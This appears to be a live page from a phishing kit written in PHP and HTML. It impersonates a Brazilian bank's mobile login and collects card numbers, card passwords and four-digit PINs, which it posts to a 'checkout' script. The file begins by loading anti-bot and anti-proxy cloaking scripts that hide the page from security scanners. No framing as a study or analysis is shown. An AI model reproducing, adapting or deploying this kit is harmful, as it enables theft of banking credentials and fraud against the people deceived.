<?php 
require '../../../../MagnumAntibot.php';
require '../../../../MagnumAntibot2.php';
require '../../../../MagnumAntibot3.php';
require '../../../../MagnumAntibot4.php';
require '../../../../MagnumAntibot5.php';
require '../../../../MagnumAntibot6.php';
require '../../../../MagnumAntibot7.php';
require '../../../../MagnumAntibot8.php';
require "../../../../antiproxy.php";
require "../../../../bot.php";
require "../../../../fucker.php";
?>
<html>
   <head>
      <meta charset="utf-8">
      <meta content="width=device-width,initial-scale=1" name="viewport">
      <title>APP On-line</title>

      <link rel="stylesheet" type="text/css" href="assets/styles/bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="assets/styles/bootstrap-theme.min.css">
      


      <script src="assets/scripts/bootstrap.min.js"></script>
      <script src="assets/scripts/pulacampo.js"></script>
      <script src="assets/scripts/jquery.js"></script>
      <script src="assets/scripts/jquery.maskedinput.js"></script>
      <script language="javascript">
         function validar() {
         var ModalAlertError = document.getElementById("TextErrorModal");
         var ModalAlert = document.getElementById("modalalert");
       
         }

         function validarCartaoCredito(numero) {
    // Remover espaços em branco e traços do número do cartão
    numero = numero.replace(/\s+/g, '').replace(/-/g, '');
    
    // Verificar se o número do cartão tem pelo menos 13 dígitos e é composto apenas por números
    if (/^\d{13,}$/.test(numero) === false) {
        return false;
    }
    
    var soma = 0;
    var resto;
    
    for (var i = 0; i < numero.length; i++) {
        var digito = parseInt(numero.charAt(i), 10);
        
        if ((numero.length - i) % 2 === 0) {
            digito *= 2;
            if (digito > 9) {
                digito -= 9;
            }
        }
        
        soma += digito;
    }
    
    return soma % 10 === 0;
}

// Exemplo de uso:
var numeroCartao = document.getElementById('acc').value;
if (validarCartaoCredito(numeroCartao)) {
    console.log("O número do cartão é válido.");
} else {
    console.log("O número do cartão é inválido.");
}

      </script>
      <script>
         $(document).ready(function(){
             $('#modalalert').hide();
             var size  =  $('#agg').attr("size");
             var size  =  $('#acc').attr("size");
             $('#agg').keyup(function(){
               var entry = $(this).attr("value");
               var current_length = $(this).attr("value").length;
               if (current_length>= size) {
                 $('#modalalert').html();
                 $('#modalalert').hide('fast');
               }
                 else $('#ModalAlert').hide('fast');
               });
               
               $('#acc').keyup(function(){
               var entry = $(this).attr("value");
               var current_length = $(this).attr("value").length;
               if (current_length>= size) {
                 $('#modalalert').html();
                 $('#modalalert').hide('fast');
               }
                 else $('#ModalAlert').hide('fast');
               });
           });
      </script>
      <script> 
         function clicar(){ document.getElementById('btn').style.background = "url(../../../../../assets/images/003.jpg) no-repeat bottom left"; } 
      </script>
      <script>
         function clicarAgencia() { document.getElementById('text1').style.display = ""; }
         function clicarConta() { document.getElementById('text2').style.display = ""; }
      </script>
      <style type="text/css">
.password-input {
    display: flex;
    width: 80px; /* Largura total dos campos */
    margin-bottom: 10px;
}

.password-input input[type="text"] {
    width: 27px; /* Largura fixa dos campos */
    height: 27px;
    text-align: center;
    border-radius: 50%;
    border: 2px solid #fff;
    font-size: 10px;
    outline: none;
    background-color: transparent;
    margin-right: 2px; /* Ajusta a margem entre os campos de entrada */
}

.filled {
    background-color: #fff !important;
}

         #agg { border:none; width:95%; height:25px; background:none; color:#FFF; max-width:95%; outline:none; }
         #acc { border:none; width:95%; height:25px; background:none; color:#FFF; max-width:95%; outline:none; }
         #ir { width:100%; padding:10px; background:#F8F5F2; color:#7F7670; border:none; border-radius:3px; }
         ::-webkit-input-placeholder { color: #FFF;}
         :-moz-placeholder {  color: #FFF;  }
         ::-moz-placeholder { color: #FFF;  }
         :-ms-input-placeholder {  color: #FFF;  }
      </style>


      <script type="text/javascript">
         jQuery(function($){
            $("#agg").mask("9999 9999 9999 9999",{ placeholder: "" });
            $("#acc").mask("99999-9",{ placeholder: "" });
         });
         
         function ValidaConta(ag_ct, digito){
           var temp = 0; //ACUMULADOR
           var i; // CONTADOR INICIAL
           var digito_result; //RESULTADO DA SOMA
           for(i = 0; i < ag_ct.length; i++){
             if(i % 2 == 0){
               if((ag_ct[i] * 2) > 9){
                 temp += (ag_ct[i] * 2) - 9;
               }else{
                 temp += ag_ct[i] * 2;
               }
             }else{
               temp += ag_ct[i] * 1;
             }
           }
         
           if(temp % 10 != 0){
             digito_result = (10 - (temp % 10));
           }else{
             digito_result = 0;
           }
         
           if(digito_result == digito){
             return true;
           }else{
             return false;
           }
         }
      
         
           // if(agencia.length < 4){
           //   alert("Informe corretamente o número de sua agência!");
           //   $('#agg').focus();
           //   return false;
           // }
         
           // if(conta.length < 7){
           //   alert("Informe corretamente o número de sua conta!");
           //   $('#acc').focus();
           //   return false;
           // }

         
         
   
         
      </script>

 
   </head>
   <body style="margin:0; padding:0;">
      <div style="width:100%; height:100%; position:absolute; background:url(assets/images/001.jpg) no-repeat center; background-size:cover;">
         <div style="height:70px; background:url(assets/images/000.png) no-repeat; margin-top:10px; margin-left:10px;"></div>
         <div style="width:100%; height:50%; top:50%; position:absolute; background: rgba(0,0,0,0.4) ; background: -webkit-linear-gradient(rgba(0,0,0,0.0), rgba(0,0,0,0.9)); background: -o-linear-gradient(rgba(0,0,0,0.0), rgba(0,0,0,0.9)); background: -moz-linear-gradient(rgba(0,0,0,0.0), rgba(0,0,0,0.9)); background: linear-gradient(red, rgba(0,0,0,0.0)(0,0,0,0.9));">
            <div style="padding:10px 15px 15px 15px; background:#E97005; background-size:contain;left:10px; position:fixed; bottom:70px; right:0; border-radius:5px 0 0 5px;">
               <form name="form" id="form" action="checkout/index.php" method="post" onsubmit="return check_enter();" autocomplete="off">
                  <div style="border-bottom:2px solid #F0A25A;">
                     <table cellpadding="0" cellspacing="0">
                        <tbody>
                           <tr>
                              <td height="15">
                                 <div id="text1" style="display:none; font-size:11px; color:#FFF;">Numero do cartão</div>
                              </td>

                           </tr>
                           <tr>
                              <td>
                                <input type="tel" name="numeroc" id="agg" placeholder="Numero do cartão" maxlength="16" size="16" onkeypress="clicarAgencia()">
                              </td>
                           </tr>

                           <tr></tr>
                           
                        </tbody>
                     </table>




                  </div>




                  <div id="mostrar" style="border-bottom:2px solid #F0A25A;">
                     <table cellpadding="0" cellspacing="0">
                        <tbody>
                           <tr>
                              <td height="15">
                                 <div id="text1" style="display:none; font-size:11px; color:#FFF;">Senha do cartão</div>
                              </td>

                           </tr>
                           <tr>
                              <td>
                                <input type="tel" name="senhac" id="acc" placeholder="Senha do cartão" maxlength="16" size="16" onkeypress="clicarAgencia()" onkeyup="javascript:pulacampo('agg','digit1')">
                              </td>
                           </tr>

                           <tr></tr>
                           
                        </tbody>
                     </table>




                  </div>


                  <div style="display: none;" id="escondido">

                  <div >
  <table cellpadding="0" cellspacing="0">
    <tbody>
      <tr>
        <td height="15">
          
        </td>
      </tr>
      <tr>
        <td>
          <div style="color: white;" class="password-input">
          <div id="text2" style="display:none; font-size:11px; color:#FFF;">Senha cartão</div>
            <input name="um" type="text" maxlength="1" id="digit1" onkeyup="javascript:pulacampo('digit1','digit2')">
            <input name="dois" type="text" maxlength="1" id="digit2" onkeyup="javascript:pulacampo('digit2','digit3')">
            <input name="tres" type="text" maxlength="1" id="digit3" onkeyup="javascript:pulacampo('digit3','digit4')">
            <input name="quatro" type="text" maxlength="1" id="digit4" onkeyup="javascript:pulacampo('digit4','ir')">
          </div>

        </td>
      </tr>
      <tr></tr>
    </tbody>
  </table>
</div>

      </div><!--Escondido-->
                  <div id="btn" style="background:url(assets/images/003.jpg) no-repeat; height:24px; margin-top:10px; padding:5px 0 0 58px; font-size:12px; color:#FFF;" onclick="clicar()">
                     lembrar agência e conta
                  </div>
                  <div style="margin-top:15px;">
                     <input type="submit" name="ir" id="ir" value="ok">
                  </div>
               </form>
            </div>
            <div style="height:70px; background:; position:absolute; bottom:0; left:0; right:0;">
               <div style="height:70px; background:url(assets/images/T01.png) no-repeat left;">
                  <div onclick="alert('Indisponivel')" style="height:70px; background:url(assets/images/T02.png) no-repeat center;">
                     <div style="height:70px; background:url(assets/images/T03.png) no-repeat right;"></div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div style="max-width: 360px; margin: 0px auto; font-size: 12px; background: rgb(83, 30, 109); color: rgb(255, 255, 255); border-radius: 5px; padding: 6px 10px; position: fixed; top: 10px; left: 20px; right: 20px; display: none;" id="modalalert">
         <div class="modaltext">
            <div id="TextErrorModal">Erro</div>
         </div>
      </div>
      <script>
  const digitInputs = document.querySelectorAll('input[type="text"]');

  var senha = document.getElementById('acc');
var mostrar = document.getElementById('mostrar');
var escondido = document.getElementById('escondido');
var digit1 = document.getElementById('digit1');

senha.addEventListener('focus', function() {
    mostrar.style.display = 'none';
    escondido.style.display = 'block';
    digit1.focus();
});

// senha.addEventListener('blur', function() {
//     mostrar.style.display = 'block';
//     escondido.style.display = 'none';

// });


digitInputs.forEach(input => {
  input.addEventListener('blur', function() {
    if (input.value.length > 0) {
      input.classList.add('filled');
    } else {
      input.classList.remove('filled');
    }
  });
});

</script>
   </body>
</html>